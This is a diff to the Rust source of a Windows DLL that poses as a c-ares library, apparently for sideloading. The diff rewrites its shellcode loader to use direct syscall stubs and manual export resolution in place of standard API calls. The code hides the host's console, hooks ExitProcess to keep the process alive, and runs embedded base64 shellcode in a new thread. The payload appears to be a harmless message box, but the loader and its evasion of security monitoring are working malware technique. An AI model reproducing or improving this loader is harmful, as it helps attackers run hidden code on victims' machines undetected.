@@ -5,18 +5,13 @@ use windows::core::{PCSTR, PSTR};
 use windows::Win32::Foundation::{BOOL, HINSTANCE};
 use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
 use windows::Win32::System::Threading::{
-    CreateProcessA, CreateThread,
     PROCESS_INFORMATION, STARTUPINFOA,
-    THREAD_CREATION_FLAGS, CREATE_NO_WINDOW,
-    INFINITE, WaitForSingleObject, CreateEventA,
+    CREATE_NO_WINDOW,
 };
-use windows::Win32::System::LibraryLoader::GetModuleHandleA;
-use windows::Win32::UI::WindowsAndMessaging::{ShowWindow, SW_HIDE};
 use base64::{Engine as _, engine::general_purpose};
-use windows::Win32::System::Console::GetConsoleWindow;
 
 mod syscall;
-use syscall::get_syscall_number;
+use syscall::{get_syscall_number, get_module_base, get_export_address};
 
 static mut ORIGINAL_EXIT_PROCESS: usize = 0;
 
@@ -39,6 +34,27 @@ asm_nt_protect_virtual_memory:
 asm_nt_write_virtual_memory:
     mov r10, rcx
     mov eax, [rsp + 0x30]
+    syscall
+    ret
+
+.global asm_nt_create_thread_ex
+asm_nt_create_thread_ex:
+    mov r10, rcx
+    mov eax, [rsp + 0x60]
+    syscall
+    ret
+
+.global asm_nt_create_event
+asm_nt_create_event:
+    mov r10, rcx
+    mov eax, [rsp + 0x30]
+    syscall
+    ret
+
+.global asm_nt_wait_for_single_object
+asm_nt_wait_for_single_object:
+    mov r10, rcx
+    mov eax, r9d
     syscall
     ret
 "#);
@@ -69,6 +85,37 @@ extern "C" {
         Buffer: *const std::ffi::c_void,
         NumberOfBytesToWrite: usize,
         NumberOfBytesWritten: &mut usize,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_create_thread_ex(
+        ThreadHandle: &mut windows_sys::Win32::Foundation::HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut std::ffi::c_void,
+        ProcessHandle: windows_sys::Win32::Foundation::HANDLE,
+        StartRoutine: *mut std::ffi::c_void,
+        Argument: *mut std::ffi::c_void,
+        CreateFlags: u32,
+        ZeroBits: usize,
+        StackSize: usize,
+        MaximumStackSize: usize,
+        AttributeList: *mut std::ffi::c_void,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_create_event(
+        EventHandle: &mut windows_sys::Win32::Foundation::HANDLE,
+        DesiredAccess: u32,
+        ObjectAttributes: *mut std::ffi::c_void,
+        EventType: u32,
+        InitialState: u8,
+        syscall_id: u32,
+    ) -> windows_sys::Win32::Foundation::NTSTATUS;
+
+    fn asm_nt_wait_for_single_object(
+        Handle: windows_sys::Win32::Foundation::HANDLE,
+        Alertable: u8,
+        Timeout: *mut i64,
         syscall_id: u32,
     ) -> windows_sys::Win32::Foundation::NTSTATUS;
 }
@@ -390,11 +437,10 @@ export_function!(ares_tolower);
 export_function!(ares_version);
 
 unsafe fn hook_exit_process() {
-    use windows::Win32::System::LibraryLoader::GetProcAddress;
+    let _ntdll_base = get_module_base("ntdll.dll").unwrap();
+    let kernel32_base = get_module_base("kernel32.dll").unwrap();
 
-    let kernel32 = GetModuleHandleA(PCSTR(b"kernel32.dll\0".as_ptr())).unwrap();
-    let exit_proc_addr = GetProcAddress(kernel32, PCSTR(b"ExitProcess\0".as_ptr()))
-        .unwrap() as *mut u8;
+    let exit_proc_addr = get_export_address(kernel32_base, "ExitProcess").unwrap() as *mut u8;
 
     ORIGINAL_EXIT_PROCESS = exit_proc_addr as usize;
 
@@ -450,8 +496,25 @@ unsafe fn hook_exit_process() {
 }
 
 unsafe extern "system" fn fake_exit_process(_exit_code: u32) {
-    let event = CreateEventA(None, true, false, PCSTR::null()).unwrap();
-    WaitForSingleObject(event, INFINITE);
+    let nt_create_event_id = get_syscall_number("NtCreateEvent").unwrap();
+    let nt_wait_id = get_syscall_number("NtWaitForSingleObject").unwrap();
+
+    let mut event_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+    asm_nt_create_event(
+        &mut event_handle,
+        0x1F0003, // EVENT_ALL_ACCESS
+        std::ptr::null_mut(),
+        1, // NotificationEvent
+        0, // Not signaled
+        nt_create_event_id,
+    );
+
+    asm_nt_wait_for_single_object(
+        event_handle,
+        0,
+        std::ptr::null_mut(), // INFINITE
+        nt_wait_id,
+    );
 }
 
 const ENCODED_SHELLCODE: &str = "/EiB5PD////o0AAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0b0gB0FCLSBhEi0AgSQHQ41xI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpT////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VSGVsbG8gZnJvbSBKdWxlcyEASnVsZXMA";
@@ -493,19 +556,29 @@ unsafe extern "system" fn shellcode_thread(_: *mut core::ffi::c_void) -> u32 {
 }
 
 unsafe extern "system" fn notepad_thread(_: *mut core::ffi::c_void) -> u32 {
+    let kernel32_base = get_module_base("kernel32.dll").unwrap();
+    let create_process_addr = get_export_address(kernel32_base, "CreateProcessA").unwrap();
+    let create_process: extern "system" fn(
+        PCSTR, PSTR, *const (), *const (), bool, u32, *const (), PCSTR, *const STARTUPINFOA, *mut PROCESS_INFORMATION
+    ) -> BOOL = std::mem::transmute(create_process_addr);
+
     let mut si = STARTUPINFOA::default();
     si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
 
     let mut pi = PROCESS_INFORMATION::default();
     let mut cmd = b"notepad.exe\0".to_vec();
 
-    let _ = CreateProcessA(
+    let _ = create_process(
         PCSTR::null(),
         PSTR(cmd.as_mut_ptr()),
-        None, None, false,
-        CREATE_NO_WINDOW,
-        None, PCSTR::null(),
-        &si, &mut pi,
+        std::ptr::null(),
+        std::ptr::null(),
+        false,
+        CREATE_NO_WINDOW.0,
+        std::ptr::null(),
+        PCSTR::null(),
+        &si,
+        &mut pi,
     );
     0
 }
@@ -518,16 +591,32 @@ pub extern "system" fn DllMain(
 ) -> BOOL {
     if fdw_reason == DLL_PROCESS_ATTACH {
         unsafe {
-            // ahot.exe konsol penceresini gizle
-            let hwnd = GetConsoleWindow();
-            ShowWindow(hwnd, SW_HIDE);
+            let user32_base = get_module_base("user32.dll").unwrap();
+            let show_window_addr = get_export_address(user32_base, "ShowWindow").unwrap();
+            let show_window: extern "system" fn(windows::Win32::Foundation::HWND, u32) -> BOOL = std::mem::transmute(show_window_addr);
 
-            // ExitProcess'i hook'la - process kapanmasın
+            let kernel32_base = get_module_base("kernel32.dll").unwrap();
+            let get_console_window_addr = get_export_address(kernel32_base, "GetConsoleWindow").unwrap();
+            let get_console_window: extern "system" fn() -> windows::Win32::Foundation::HWND = std::mem::transmute(get_console_window_addr);
+
+            let hwnd = get_console_window();
+            show_window(hwnd, 0); // SW_HIDE = 0
+
             hook_exit_process();
 
-            // Shellcode'u başlat
-            let _ = CreateThread(
-                None, 0, Some(shellcode_thread), None, THREAD_CREATION_FLAGS(0), None,
+            let nt_create_thread_id = get_syscall_number("NtCreateThreadEx").unwrap();
+            let mut thread_handle: windows_sys::Win32::Foundation::HANDLE = 0;
+
+            asm_nt_create_thread_ex(
+                &mut thread_handle,
+                0x1FFFFF, // THREAD_ALL_ACCESS
+                std::ptr::null_mut(),
+                -1isize as windows_sys::Win32::Foundation::HANDLE,
+                shellcode_thread as *mut std::ffi::c_void,
+                std::ptr::null_mut(),
+                0, 0, 0, 0,
+                std::ptr::null_mut(),
+                nt_create_thread_id,
             );
         }
     }
